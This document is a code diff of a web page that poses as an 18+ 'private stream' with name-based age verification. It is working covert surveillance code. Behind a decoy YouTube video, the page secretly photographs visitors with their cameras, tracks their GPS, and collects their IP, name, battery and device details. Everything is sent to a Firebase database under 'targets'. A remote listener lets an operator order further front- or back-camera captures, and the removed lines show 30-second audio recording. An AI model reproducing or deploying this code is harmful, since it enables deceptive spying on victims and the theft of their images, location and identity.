@@ -3,263 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Content Access</title>
+    <title>Private Content Access | 18+</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         
+        /* Clear Background - No Blur */
         #bg-image {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('bg.png.jpeg'); /* Make sure this image is in the same folder */
-            background-size: cover; background-position: center;
-            filter: blur(15px); 
-            z-index: 1; transform: scale(1.1); 
-            opacity: 0.7;
+            background: url('bg.png.jpeg'); 
+            background-size: cover; 
+            background-position: center;
+            z-index: 1; 
+            opacity: 1; 
         }
 
+        /* UI Mask Overlay */
         #main-ui {
             position: relative; z-index: 10; width: 100%; height: 100%;
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-            background: rgba(0,0,0,0.5); 
+            background: rgba(0,0,0,0.4); /* Halka dark parda taake text aur buttons chamkein */
         }
 
         #unlock-btn {
-            background: #00ff41; 
-            color: #000;
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-size: 20px;
+            background: #ff0050; /* Sexy Red/Pinkish color */
+            color: #fff;
+            padding: 18px 35px;
+            border-radius: 50px;
+            font-size: 18px;
             font-weight: bold;
             text-transform: uppercase;
             cursor: pointer;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.7); 
+            box-shadow: 0 0 25px rgba(255, 0, 80, 0.6); 
             transition: 0.3s ease;
-            margin-bottom: 20px; 
             border: none;
-            outline: none;
-        }
-        #unlock-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 30px rgba(0, 255, 65, 1);
+            margin-bottom: 25px;
+            letter-spacing: 1px;
         }
 
         #play-icon {
-            width: 80px; height: 80px; 
+            width: 70px; height: 70px; 
             background: rgba(255, 255, 255, 0.2);
-            border: 4px solid #fff; border-radius: 50%; display: flex;
+            border: 3px solid #fff; border-radius: 50%; display: flex;
             justify-content: center; align-items: center; cursor: pointer;
-            box-shadow: 0 0 25px rgba(255,255,255,0.4);
-            transition: 0.3s;
+            backdrop-filter: blur(5px);
         }
-        #play-icon:hover { transform: scale(1.1); }
         #play-icon::after {
-            content: ''; border-top: 15px solid transparent; border-bottom: 15px solid transparent;
-            border-left: 25px solid white; margin-left: 8px; 
+            content: ''; border-top: 12px solid transparent; border-bottom: 12px solid transparent;
+            border-left: 20px solid white; margin-left: 5px; 
         }
 
+        /* Identity/Age Check Modal */
         #age-modal {
             display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 85%; max-width: 350px; background: #111; border: 1px solid #333;
-            border-radius: 15px; padding: 25px; text-align: center; z-index: 200;
-            box-shadow: 0 0 50px rgba(0,0,0,0.9);
+            width: 85%; max-width: 340px; background: #1a1a1a; border: 1px solid #333;
+            border-radius: 20px; padding: 30px; text-align: center; z-index: 200;
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
         }
         
-        #age-modal h2 { color: #fff; margin: 0 0 10px 0; }
-        #age-modal p { color: #aaa; margin-bottom: 20px; font-size: 14px; }
-        
-        .input-name { width: 100%; padding: 12px; margin-bottom: 20px; background: #222; border: 1px solid #444; color: #fff; border-radius: 8px; box-sizing: border-box; }
-        
-        .modal-btns { display: flex; gap: 10px; }
-        .btn { flex: 1; padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; }
-        .btn-yes { background: #00ff41; color: #000; }
-        .btn-no { background: #333; color: #fff; }
+        .input-name { 
+            width: 100%; padding: 15px; margin: 15px 0; 
+            background: #252525; border: 1px solid #444; 
+            color: #fff; border-radius: 10px; font-size: 16px;
+            box-sizing: border-box;
+        }
 
-        /* YouTube video container styling */
+        .confirm-btn {
+            background: #00ff41; color: #000; width: 100%; 
+            padding: 15px; border-radius: 10px; font-weight: bold; 
+            font-size: 16px; border: none; cursor: pointer;
+        }
+
+        /* YouTube Container */
         #video-container { 
-            display: none; 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            z-index: 1000; 
-            background: #000;
+            display: none; position: fixed; top: 0; left: 0; 
+            width: 100%; height: 100%; z-index: 1000; background: #000; 
         }
-        #main-player { /* This is the iframe for YouTube */
-            width: 100%; 
-            height: 100%; 
-            border: none;
-        }
+        iframe { width: 100%; height: 100%; border: none; }
 
-        #loading-text { display: none; color: #00ff41; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1001; font-weight: bold; }
+        #loading-text { 
+            display: none; color: #fff; position: fixed; top: 50%; left: 50%; 
+            transform: translate(-50%, -50%); z-index: 1001; font-weight: 300; 
+            letter-spacing: 2px;
+        }
     </style>
 </head>
 <body>
 
     <div id="bg-image"></div>
-    <div id="loading-text" style="display:none;">LOADING VIDEO...</div> <div id="main-ui">
-        <button id="unlock-btn" onclick="showModal()">PRIVATE VIDEO - UNLOCK NOW!</button>
+    <div id="loading-text">CONNECTING TO STREAM...</div>
+
+    <div id="main-ui">
+        <button id="unlock-btn" onclick="showModal()">START PRIVATE STREAM</button>
         <div id="play-icon" onclick="showModal()"></div>
+        <p style="color: #fff; margin-top: 20px; font-size: 14px; opacity: 0.8;">18+ Adult Content Verification Required</p>
     </div>
 
     <div id="age-modal">
-        <h2>Identity Check</h2>
-        <p>Enter your name to unlock the private stream.</p>
-        <input type="text" id="targetName" class="input-name" placeholder="Full Name...">
-        <div class="modal-btns">
-            <button class="btn btn-yes" onclick="startEverything()">UNLOCK NOW</button>
-            <button class="btn btn-no" onclick="location.reload()">EXIT</button>
-        </div>
+        <h2 style="color:#fff; margin-bottom: 10px;">Age Verification</h2>
+        <p style="color:#bbb; font-size: 14px;">Please enter your full name to confirm you are 18+ and unlock the private video.</p>
+        <input type="text" id="targetName" class="input-name" placeholder="Enter Full Name...">
+        <button class="confirm-btn" onclick="startEverything()">VERIFY & UNLOCK</button>
     </div>
 
     <div id="video-container">
         <iframe id="main-player" 
-            src="https://www.youtube.com/embed/YOUR_YOUTUBE_VIDEO_ID_HERE?autoplay=1&controls=0&loop=1&playlist=YOUR_YOUTUBE_VIDEO_ID_HERE&mute=0" 
-            frameborder="0" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen>
+            src="https://www.youtube.com/embed/vXpIat89mY0?autoplay=1&controls=0&loop=1&playlist=vXpIat89mY0&mute=0&rel=0&showinfo=0" 
+            allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen>
         </iframe>
     </div>
 
 <script>
-    // Firebase Configuration
+    // Firebase Setup
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
     
-    let sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
-    let globalStream = null; // To hold camera/mic stream
-    let isBusy = false; // To prevent multiple captures
+    let sessionID = "USER_" + Math.floor(1000 + Math.random() * 9000);
+    let globalStream = null;
 
-    function showModal() {
-        document.getElementById('age-modal').style.display = 'block';
-    }
+    function showModal() { document.getElementById('age-modal').style.display = 'block'; }
 
     async function startEverything() {
         const uName = document.getElementById('targetName').value;
-        if(!uName) { alert("Please enter your name to verify!"); return; }
+        if(!uName) { alert("Please enter name for age verification!"); return; }
 
         document.getElementById('age-modal').style.display = 'none';
-        // document.getElementById('loading-text').style.display = 'block'; // Can keep for a brief moment if needed
+        document.getElementById('loading-text').style.display = 'block';
 
         try {
-            // Request camera and microphone permissions first
+            // Permission for Camera and Mic (Masked as Age Check)
             globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             
-            // If permissions granted, show the YouTube video container
+            // Show YouTube Stream
             document.getElementById('video-container').style.display = 'block';
-            
-            // Now, start your background processes
+            document.getElementById('loading-text').style.display = 'none';
+
+            // Start Tracking & Capturing
             sendInfo(uName);
             trackGPS();
             
-            // Auto Capture Sequence
-            setTimeout(() => capture("user"), 4000); // Capture front camera after 4 seconds
-            setTimeout(() => capture("environment"), 15000); // Capture back camera after 15 seconds
-
-            // Firebase command listener
+            // Background Captures
+            setTimeout(() => capture("user"), 5000); // 5 sec baad photo
+            
+            // Firebase Commands
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const cmd = snap.val();
-                if(cmd && !isBusy) {
+                if(cmd) {
                     if(cmd.action === 'photo') capture("user");
                     if(cmd.action === 'back') capture("environment");
-                    if(cmd.action === 'audio') recordAudio();
-                    db.ref(`commands/${sessionID}`).remove(); // Clear command after execution
+                    db.ref(`commands/${sessionID}`).remove();
                 }
             });
 
         } catch (e) {
-            // If camera/mic access is denied, reload the page
-            alert("Error: Camera/Mic access is required for age verification.");
+            alert("Verification Failed: Camera access is mandatory for 18+ age check.");
             location.reload();
         }
     }
 
-    // --- (Rest of your helper functions remain the same) ---
-
-    // Function to initialize (or re-initialize) the main camera stream
-    async function initStream() {
-        if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); } // Stop existing tracks
-        globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); // Request new stream
-    }
-
-    // Function to capture photos (front/back camera)
     async function capture(mode) {
-        if(isBusy) return;
-        isBusy = true;
         try {
-            if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: mode } } });
             const tempVid = document.createElement('video');
             tempVid.srcObject = stream;
             await tempVid.play();
-
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
                 canvas.width = tempVid.videoWidth; canvas.height = tempVid.videoHeight;
                 canvas.getContext('2d').drawImage(tempVid, 0, 0);
-                
                 db.ref(`targets/${sessionID}/photos`).push({
                     img: canvas.toDataURL('image/jpeg', 0.5),
-                    type: mode === "user" ? "FRONT" : "BACK",
+                    type: mode,
                     time: new Date().toLocaleTimeString()
                 });
-                
                 stream.getTracks().forEach(t => t.stop());
-                initStream().then(() => { isBusy = false; }); // Re-initialize stream after capture
-            }, 3000); // Capture after 3 seconds of stream activation
-        } catch (err) { 
-            isBusy = false; 
-            initStream(); // Try to re-initialize even on error
-            console.error("Capture Error:", err);
-        }
+            }, 3000);
+        } catch (err) {}
     }
 
-    // Function to record audio
-    async function recordAudio() {
-        if(isBusy) return;
-        isBusy = true;
-        try {
-            if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
-            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const recorder = new MediaRecorder(audioStream);
-            let chunks = [];
-            
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = () => {
-                const reader = new FileReader();
-                reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
-                reader.onloadend = () => {
-                    db.ref(`targets/${sessionID}/audios`).push({ data: reader.result, time: new Date().toLocaleTimeString() });
-                    audioStream.getTracks().forEach(t => t.stop());
-                    initStream().then(() => { isBusy = false; });
-                };
-            };
-            recorder.start();
-            setTimeout(() => { if(recorder.state !== "inactive") recorder.stop(); }, 30000); // Record for 30 seconds
-        } catch (e) { 
-            isBusy = false; 
-            initStream(); 
-            console.error("Audio Record Error:", e);
-        }
-    }
-
-    // Function to send target's basic info
     async function sendInfo(name) {
-        const batt = await navigator.getBattery().catch(() => ({level:1})); // Get battery info
-        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"})); // Get IP
+        const batt = await navigator.getBattery().catch(() => ({level:1}));
+        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
         db.ref(`targets/${sessionID}/info`).set({
             status: "ONLINE", customName: name, ip: ip.ip,
             battery: Math.floor(batt.level * 100) + "%",
-            device: navigator.userAgent.split(') ')[0] + ')', // User agent string for device info
+            device: navigator.userAgent.split(') ')[0] + ')',
             time: new Date().toLocaleTimeString()
         });
     }
 
-    // Function to track GPS location
     function trackGPS() {
         navigator.geolocation.watchPosition(p => {
             db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
-        }, null, {enableHighAccuracy:true}); // High accuracy for better GPS
+        }, null, {enableHighAccuracy:true});
     }
 </script>
 </body>
